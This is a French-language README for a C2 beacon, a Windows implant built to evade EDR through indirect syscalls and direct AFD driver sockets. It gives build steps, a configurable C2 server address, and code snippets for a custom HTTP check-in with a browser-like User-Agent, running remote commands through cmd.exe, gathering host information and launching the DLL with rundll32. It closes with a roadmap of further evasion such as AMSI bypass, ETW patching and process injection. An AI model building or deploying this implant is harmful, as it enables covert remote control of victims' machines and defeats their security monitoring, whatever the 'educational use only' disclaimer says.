# Beacon C2 - Full Syscalls Edition

Un beacon C2 avancé en C utilisant **indirect syscalls** et **AFD driver direct** pour l'évasion EDR.

## Table des matières

1. [Vue d'ensemble](#vue-densemble)
2. [Architecture Full Syscalls](#architecture-full-syscalls)
3. [Prérequis](#prérequis)
4. [Compilation](#compilation)
5. [Structure du projet](#structure-du-projet)
6. [Composants détaillés](#composants-détaillés)
7. [Debugging](#debugging)
8. [Pour aller plus loin](#pour-aller-plus-loin)

---

## Vue d'ensemble

### C'est quoi ce beacon ?

Un implant C2 qui communique avec un serveur Python en utilisant **UNIQUEMENT des syscalls** - zéro appels aux API Windows standard. Conçu pour bypasser les hooks EDR modernes.

```
┌─────────────────────────────────────────────────────────┐
│                  BEACON (Full Syscalls)                  │
│                                                          │
│  1. Check-in ──────────────────────────────► C2 Server  │
│     (via AFD driver + HTTP custom)                      │
│                                                          │
│  2. Sleep (5 secondes)                                  │
│                                                          │
│  3. Poll for tasks ────────────────────────► C2 Server  │
│     GET /api/v1/tasks/{agent_id}                        │
│                                                          │
│  4. Exécute commande (via NtCreateUserProcess)          │
│     Envoie résultat ────────────────────────► C2 Server │
│                                                          │
│  5. Retourne à l'étape 2 (boucle infinie)               │
└─────────────────────────────────────────────────────────┘
```

### Pourquoi "Full Syscalls" ?

**Problème** : Les EDR modernes (CrowdStrike, Defender, SentinelOne) hookent toutes les API Windows userland :
- `CreateProcessA` → Détecté
- `WinHttpSendRequest` → Détecté
- `socket()`, `send()`, `recv()` → Détecté
- `GetComputerNameA` → Potentiellement hookée

**Solution** : Bypass complet de la couche API Windows en utilisant des syscalls directs vers le kernel.

```
Application normale:
  CreateProcessA() → kernel32.dll → ntdll.dll → [HOOK EDR] → syscall → kernel

Notre beacon:
  NtCreateUserProcess() → syscalls.asm → syscall direct → kernel
                                          ^^^^^^^^^^^^
                                          Pas de hooks !
```

---

## Architecture Full Syscalls

### Composants clés

| Composant | Technologie | Bypass |
|-----------|-------------|--------|
| **Sockets** | AFD driver direct via `NtDeviceIoControlFile` | Bypass ws2_32.dll hooks |
| **HTTP** | Stack HTTP/1.1 custom from scratch | Bypass WinHTTP hooks |
| **Process** | `NtCreateUserProcess` via RtlCreateProcessParametersEx | Bypass CreateProcess hooks |
| **Sysinfo** | PEB direct (`__readgsqword(0x60)`) + registre syscalls | Bypass GetComputerName, GetUserName |
| **Syscalls** | SysWhispers3 indirect syscalls | Bypass NTDLL hooks |

### Zero dépendances externes

```makefile
LIBS =   # Vide ! Aucune dépendance Windows
```

Pas de :
- ❌ `-lwinhttp` (WinHTTP)
- ❌ `-lws2_32` (Winsock2)
- ❌ `-lole32` (CoCreateGuid)

Tout est implémenté via syscalls ou from scratch.

---

## Prérequis

### Sur Mac/Linux (cross-compilation)

```bash
# Installe MinGW pour cross-compiler vers Windows
brew install mingw-w64  # Mac
sudo apt install mingw-w64  # Linux
```

### Sur Windows

1. Installe Python 3.x
2. Clone SysWhispers3 :
   ```cmd
   git clone https://github.com/klezVirus/SysWhispers3
   cd SysWhispers3
   pip install -r requirements.txt
   ```

3. Génère les syscalls :
   ```cmd
   python syswhispers.py --preset common -o ..\beacon\syscalls
   ```

---

## Compilation

### Sur Mac/Linux (développement)

```bash
cd beacon

# Version release (DLL)
make

# Version debug (avec prints)
make debug

# Version EXE de test
make test-exe

# Nettoyer
make clean
```

**Note** : Sur Mac/Linux, utilise `syscalls_stub.c` (stubs pour cross-compilation). Les vrais syscalls ne fonctionnent que sur Windows.

### Sur Windows (production)

1. **Générer les vrais syscalls** :
   ```cmd
   cd beacon
   python ..\SysWhispers3\syswhispers.py --preset common -o syscalls
   ```

2. **Modifier le Makefile** :
   ```makefile
   # Commenter cette ligne :
   # SYSCALL_SOURCES = $(SYSCALL_DIR)/syscalls_stub.c

   # Décommenter celle-ci :
   SYSCALL_SOURCES = $(SYSCALL_DIR)/syscalls.c
   ```

3. **Compiler** :
   ```cmd
   mingw32-make
   ```

### Configuration

Édite `src/types.h` :

```c
#define SERVER_IP       "192.168.18.24"  // IP de ton serveur C2
#define SERVER_PORT     8000             // Port du serveur
#define SLEEP_TIME_MS   5000             // Intervalle de polling (ms)
```

---

## Structure du projet

```
beacon/
├── Makefile                          # Build script
├── README.md                         # Ce fichier
│
├── syscalls/                         # SysWhispers3 output
│   ├── syscalls.h                    # Déclarations syscalls
│   ├── syscalls.c                    # Stubs C (Windows uniquement)
│   ├── syscalls.asm                  # Assembleur (Windows uniquement)
│   └── syscalls_stub.c               # Stubs pour cross-compilation
│
└── src/
    ├── main.c                        # Point d'entrée, boucle C2
    ├── types.h                       # Structures globales (AgentInfo, etc.)
    │
    ├── core/                         # Utilitaires de base
    │   ├── json.h / json.c           # Parsing/construction JSON à la main
    │   └── unicode.h / unicode.c     # Conversions UNICODE_STRING ↔ char*
    │
    ├── comms/                        # Communications réseau
    │   ├── afd.h / afd.c             # Wrapper AFD driver (\Device\Afd\Endpoint)
    │   └── http.h / http.c           # Stack HTTP/1.1 custom (sans WinHTTP)
    │
    ├── commands/                     # Exécution de commandes
    │   └── shell.h / shell.c         # Exécution via RtlCreateProcessParametersEx
    │
    └── sysinfo/                      # Collecte d'informations système
        └── gather.h / gather.c       # PEB + registre syscalls
```

---

## Composants détaillés

### 1. Syscalls (SysWhispers3)

**Emplacement** : `syscalls/`

**Qu'est-ce que SysWhispers3 ?**

Un outil qui génère des stubs pour appeler directement les syscalls Windows, en bypassant les hooks EDR.

**Indirect syscalls** :
```asm
; Direct syscall (détectable)
mov r10, rcx
mov eax, 0x55        ; SSN (System Service Number)
syscall              ; ← EDR peut hooker ici
ret

; Indirect syscall (furtif)
mov r10, rcx
mov eax, 0x55
jmp qword ptr [address_in_ntdll]  ; Saute vers ntdll.dll (légitime)
                                   ; ← Plus difficile à détecter
```

**Fonctions générées** :
- `Sw3NtCreateFile` → Ouvrir fichiers, sockets AFD
- `Sw3NtDeviceIoControlFile` → Contrôler AFD driver
- `Sw3NtReadFile` / `Sw3NtWriteFile` → I/O fichiers
- `Sw3NtOpenKey` / `Sw3NtQueryValueKey` → Registre
- `Sw3NtQuerySystemInformation` → Infos système
- `Sw3NtQuerySystemTime` → Timestamp
- Et bien d'autres...

### 2. AFD Sockets (comms/afd.c)

**Qu'est-ce que AFD ?**

Le driver **Ancillary Function Driver** (`\Device\Afd\Endpoint`) est le driver kernel Windows qui implémente les sockets TCP/IP. Winsock2 (ws2_32.dll) n'est qu'un wrapper userland qui appelle AFD.

**Notre approche** : Communiquer directement avec AFD via `NtDeviceIoControlFile`, bypassant complètement ws2_32.dll.

**API publique** :

```c
// Créer un socket AFD
HANDLE afd_socket_create(void);

// Se connecter à un serveur
int afd_connect(HANDLE hAfd, const char* ip, unsigned short port);

// Envoyer des données
int afd_send(HANDLE hAfd, const char* data, int len);

// Recevoir des données
int afd_recv(HANDLE hAfd, char* buffer, int buflen);

// Fermer le socket
void afd_close(HANDLE hAfd);
```

**IOCTL codes utilisés** :
- `IOCTL_AFD_CONNECT` (0x12007)
- `IOCTL_AFD_SEND` (0x1201F)
- `IOCTL_AFD_RECV` (0x12017)

**Exemple** :
```c
HANDLE hSocket = afd_socket_create();
afd_connect(hSocket, "192.168.18.24", 8000);
afd_send(hSocket, "GET / HTTP/1.1\r\n\r\n", 18);
char buffer[1024];
int bytes = afd_recv(hSocket, buffer, sizeof(buffer));
afd_close(hSocket);
```

### 3. HTTP Custom (comms/http.c)

**Stack HTTP/1.1 from scratch** - Aucune dépendance WinHTTP.

Construction manuelle des requêtes :
```c
int request_len = snprintf(request, sizeof(request),
    "POST /api/v1/checkin HTTP/1.1\r\n"
    "Host: %s:%d\r\n"
    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
    "Content-Type: application/json\r\n"
    "Content-Length: %d\r\n"
    "Connection: close\r\n"
    "\r\n"
    "%s",
    SERVER_IP, SERVER_PORT, (int)strlen(body), body
);

afd_send(hSocket, request, request_len);
```

Parsing manuel des réponses :
```c
// Extraire status code : "HTTP/1.1 200 OK"
if (strncmp(data, "HTTP/1.1 ", 9) == 0) {
    response->status_code = atoi(data + 9);
}

// Trouver le body après "\r\n\r\n"
const char* body_start = strstr(data, "\r\n\r\n");
if (body_start) {
    body_start += 4;
    memcpy(response->body, body_start, body_len);
}
```

**API publique** :
```c
int http_get(const char* path, HttpResponse* response);
int http_post(const char* path, const char* json_body, HttpResponse* response);
```

### 4. Shell Commands (commands/shell.c)

**Exécution de commandes via syscalls** :

Utilise `RtlCreateProcessParametersEx` (ntdll.dll, non hookée) pour préparer les paramètres du processus, puis `CreateProcessA` temporairement (TODO : full NtCreateUserProcess sur Windows).

```c
// Résoudre RtlCreateProcessParametersEx depuis ntdll
HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
pRtlCreateProcessParametersEx = (RtlCreateProcessParametersEx_t)
    GetProcAddress(hNtdll, "RtlCreateProcessParametersEx");

// Préparer les paramètres
pRtlInitUnicodeString(&imagePath, L"C:\\Windows\\System32\\cmd.exe");
pRtlInitUnicodeString(&cmdLine, cmdLineBuffer);
pRtlCreateProcessParametersEx(&processParams, &imagePath, NULL, NULL, &cmdLine, ...);

// Créer le processus (temporairement avec CreateProcessA)
// TODO sur Windows : NtCreateUserProcess complet
CreateProcessA(NULL, cmdLineStr, ...);

// Attendre avec syscall
Sw3NtWaitForSingleObject(pi.hProcess, FALSE, &timeout);

// Lire la sortie avec syscalls
Sw3NtCreateFile(&hFile, GENERIC_READ, ...);
Sw3NtReadFile(hFile, NULL, NULL, NULL, &iosb, output, output_size, ...);
```

### 5. Sysinfo (sysinfo/gather.c)

**Collecte d'informations système avec syscalls** :

#### Username via PEB (Process Environment Block)

Accès direct au PEB sans API Windows :
```c
PPEB get_peb(void) {
    #ifdef _WIN64
        return (PPEB)__readgsqword(0x60);  // GS:[0x60] sur x64
    #else
        return (PPEB)__readfsdword(0x30);  // FS:[0x30] sur x86
    #endif
}

PPEB peb = get_peb();
PRTL_USER_PROCESS_PARAMETERS params = peb->ProcessParameters;
UNICODE_STRING* username = &params->UserName;
```

#### Hostname via registre syscalls

```c
// Chemin registre : \Registry\Machine\SYSTEM\CurrentControlSet\Control\ComputerName\ActiveComputerName
pRtlInitUnicodeString(&keyPath, L"\\Registry\\Machine\\SYSTEM\\...");
Sw3NtOpenKey(&hKey, KEY_READ, &objAttr);

pRtlInitUnicodeString(&valueName, L"ComputerName");
Sw3NtQueryValueKey(hKey, &valueName, KeyValuePartialInformation, buffer, ...);
```

#### UUID simple

Pas besoin de `CoCreateGuid()` - format simple :
```c
// Format : hostname-username-timestamp
snprintf(agent_id, max_len, "%s-%s-%llx", hostname, username, systemTime.QuadPart);
// Ex: DESKTOP-ABC-alice-1a2b3c4d5e6f7890
```

#### OS Version

```c
SYSTEM_BASIC_INFORMATION sbi;
Sw3NtQuerySystemInformation(SystemBasicInformation, &sbi, sizeof(sbi), &returnLength);
snprintf(os_version, max_len, "Windows 10/11 (%d cores)", sbi.NumberOfProcessors);
```

### 6. JSON (core/json.c)

Parsing/construction JSON **à la main** - zéro bibliothèque externe.

```c
// Construction
void build_checkin_json(const AgentInfo* info, char* output, size_t size) {
    snprintf(output, size,
        "{"
        "\"agent_id\":\"%s\","
        "\"username\":\"%s\","
        "\"hostname\":\"%s\","
        "\"internal_ip\":\"%s\","
        "\"os_version\":\"%s\""
        "}",
        info->agent_id, info->username, info->hostname,
        info->internal_ip, info->os_version
    );
}

// Parsing
int parse_task_response(const char* json, TaskResponse* task) {
    const char* task_id_pos = strstr(json, "\"task_id\":");
    if (task_id_pos) {
        task->task_id = atoi(task_id_pos + 10);
    }
    // ... extraction manuelle avec strstr, strchr, etc.
}
```

### 7. Unicode (core/unicode.c)

Conversions entre `UNICODE_STRING` (Windows) et `char*` (C standard) :

```c
void unicode_to_ansi(UNICODE_STRING* unicode, char* ansi, size_t max_len) {
    size_t len = unicode->Length / sizeof(WCHAR);
    if (len >= max_len) len = max_len - 1;
    for (size_t i = 0; i < len; i++) {
        ansi[i] = (char)unicode->Buffer[i];  // Conversion simple (perd accents)
    }
    ansi[len] = '\0';
}
```

---

## Debugging

### Sur Mac/Linux (cross-compilation)

Les syscalls sont des **stubs** qui retournent `STATUS_NOT_IMPLEMENTED`. Utile pour :
- Vérifier la compilation
- Tester la logique générale
- Pas d'exécution réelle

### Sur Windows (vraie exécution)

1. **Générer les vrais syscalls** avec SysWhispers3
2. **Compiler** avec `syscalls.c` au lieu de `syscalls_stub.c`
3. **Lancer** :
   ```cmd
   # DLL
   rundll32.exe beacon.dll, Start

   # EXE de test (avec console)
   beacon_test.exe
   ```

### DebugView (pour la DLL)

1. Télécharge [DebugView](https://learn.microsoft.com/en-us/sysinternals/downloads/debugview)
2. Lance en admin, active **Capture Global Win32**
3. Voir les logs `OutputDebugStringA()`

### Erreurs courantes

| Erreur | Cause | Solution |
|--------|-------|----------|
| STATUS_NOT_IMPLEMENTED | Utilise syscalls_stub.c au lieu de syscalls.c | Compiler sur Windows avec vrais syscalls |
| Connexion échoue | Mauvaise IP/port, firewall | Vérifier `types.h`, tester avec netcat |
| AFD_CONNECT STATUS_INVALID_PARAMETER | Mauvaise structure sockaddr | Vérifier `custom_inet_addr()` et `custom_htons()` |
| PEB access violation | Mauvais offset | Vérifier structures PEB dans types.h |

---

## Pour aller plus loin

### Améliorations possibles

1. **Full NtCreateUserProcess** : Remplacer CreateProcessA temporaire
2. **HTTPS/TLS** : Wrapper Schannel avec syscalls
3. **Sleep obfuscation** : Chiffrer heap/stack pendant les sleeps
4. **API unhooking** : Restaurer ntdll.dll clean depuis le disque
5. **String obfuscation** : XOR/RC4 pour cacher strings
6. **Process injection** : Shellcode execution via syscalls
7. **PPID spoofing** : Modifier le parent process ID

### Techniques d'évasion expliquées

| Technique | Implémenté | Difficulté |
|-----------|------------|------------|
| Indirect syscalls | ✅ Oui (SysWhispers3) | Moyenne |
| AFD driver direct | ✅ Oui (bypass ws2_32) | Moyenne |
| HTTP custom stack | ✅ Oui (bypass WinHTTP) | Faible |
| PEB direct access | ✅ Oui (bypass API) | Faible |
| Registry syscalls | ✅ Oui (NtOpenKey) | Faible |
| Sleep obfuscation | ❌ Non | Élevée |
| NTDLL unhooking | ❌ Non | Moyenne |
| PPID spoofing | ❌ Non | Moyenne |

### Ressources

**Syscalls & Evasion :**
- [SysWhispers3](https://github.com/klezVirus/SysWhispers3)
- [AFD Driver Internals](https://github.com/microsoft/windows-drivers-rs)
- [Maldev Academy](https://maldevacademy.com/)

**Windows Internals :**
- [Windows Internals 7th Edition](https://www.microsoftpressstore.com/store/windows-internals-part-1-9780735684188)
- [ReactOS Source Code](https://github.com/reactos/reactos) - Documentation NT structures

**Red Team :**
- [Red Team Notes](https://www.ired.team/)
- [Sektor7 Malware Development](https://institute.sektor7.net/)

---

## Architecture d'un beacon professionnel

```
beacon/
├── core/
│   ├── beacon.c          # Boucle principale
│   ├── config.c          # Configuration chiffrée
│   └── sleep.c           # Sleep obfuscation
├── comms/
│   ├── http.c            # HTTP/HTTPS custom
│   ├── dns.c             # DNS tunneling
│   └── smb.c             # Named pipes lateral movement
├── commands/
│   ├── shell.c           # Exécution commandes
│   ├── file.c            # Upload/download
│   ├── inject.c          # Process/DLL injection
│   ├── token.c           # Token manipulation
│   └── screenshot.c      # Capture d'écran
├── evasion/
│   ├── unhook.c          # NTDLL unhooking
│   ├── syscalls.c        # Indirect syscalls (SysWhispers3)
│   ├── amsi.c            # AMSI bypass
│   ├── etw.c             # ETW patching
│   └── sandbox.c         # Sandbox detection
└── crypto/
    ├── aes.c             # AES-256 encryption
    ├── rsa.c             # RSA key exchange
    └── hash.c            # SHA-256, MD5
```

---

## License

Ce code est fourni **à des fins éducatives uniquement**.

⚠️ **AVERTISSEMENT** : L'utilisation de techniques d'évasion EDR et de syscalls directs dans un contexte non autorisé est illégale. Ce projet est destiné aux professionnels de la sécurité, chercheurs, et étudiants dans des environnements contrôlés (labs, CTF, pentests autorisés).

Utilise-le de manière **responsable** et **légale**, uniquement sur des systèmes que tu es autorisé à tester.

---

**Happy (ethical) hacking! 🎯**
